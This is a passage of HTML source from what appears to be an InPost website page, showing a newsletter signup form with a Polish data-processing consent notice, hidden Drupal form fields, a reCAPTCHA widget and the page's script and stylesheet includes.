                                        <p class='input--info mb-2 toggleContent _d-none'>InPost sp. z o.o. będzie przetwarzać Twoje dane osobowe w celach marketingowych, w tym poprzez profilowanie oraz w celu kierowania do Ciebie informacji handlowych drogą elektroniczną w zakresie objętym wyrażoną
                                            zgodą. Wycofanie zgody na otrzymywanie informacji handlowych jest możliwe w dowolnym momencie, co nie wpływa na zgodność przetwarzania danych przed jej wycofaniem. Masz też prawo wyrazić sprzeciw wobec przetwarzania
                                            Twoich danych w celach marketingowych. Więcej informacji na temat przetwarzania danych osobowych, w tym o przysługujących Ci prawach, znajduje się w <a href='/ochrona-danych-osobowych' target='_blank' class='link--component -xs'>Polityce Prywatności</a></p>
                                        <a
                                            href='/' class='link--component -xs toggleLink'><span class='show'>Rozwiń</span><span class='hide'>Zwiń</span></a>
                                    </div><input autocomplete="off" data-drupal-selector="form-nzr1ud-vumdmowapn3qmocyflguvw9x9q-mmbhzpxfk" type="hidden" name="form_build_id" value="form-NzR1uD_VuMDmOwapN3qMOcYflgUVW9x9q_mmbhZPXfk" />
                                    <input data-drupal-selector="edit-newsletter" type="hidden" name="form_id" value="newsletter" />
                                    <div class="row">
                                        <div class="col-12 my-4">
                                            <div class="row newsletterCaptchaWrapper">
                                                <div class="col-12 d-flex align-items-center justify-content-md-start">
                                                    <div class="g-recaptcha" data-hl="pl" data-sitekey="6LfiL04UAAAAAAB_FAA7fCc6wZ3GcqE-0fKcjcBe"></div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </form>


                        </div>
                    </div>



                    <div class="body-cover bodyCover"></div>

                </div>
            </div>

        </div>
    </div>
    </div>

    <script src="sites/default/files/js/js_8ACnBdjvkqHrJzk5_3ngU_aRn2q83nPLe3i85mi9brY.js"></script>
    <script src="themes/custom/inpost/js/doubleclick.js?rnyh3v"></script>
    <script src="themes/custom/inpost/js/homepageAds.js?rnyh3v"></script>
    <script src="sites/default/files/js/js_nDKWqOmdeR4PxR_OJI5klFdXhUtwI02eqNsTCeohzHQ.js"></script>
    <script src="modules/custom/inpost_popup/js/popup.js?v=1.x"></script>



    <link rel="stylesheet" media="all" href="sites/default/files/css/css_somEP66usePOA-KcmaCBv2rNBFYNnAt52CYXbIQ0SGQ.css?rnyh3v" />
    <link rel="stylesheet" media="all" href="//fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&amp;display=swap" />
    <link rel="stylesheet" media="all" href="sites/default/files/css/css_BUzfBM6d0KYGEP1vF_Ci5K80nHPRh9s6zV0kQc80xIk.css?rnyh3v" />

</body>

</html>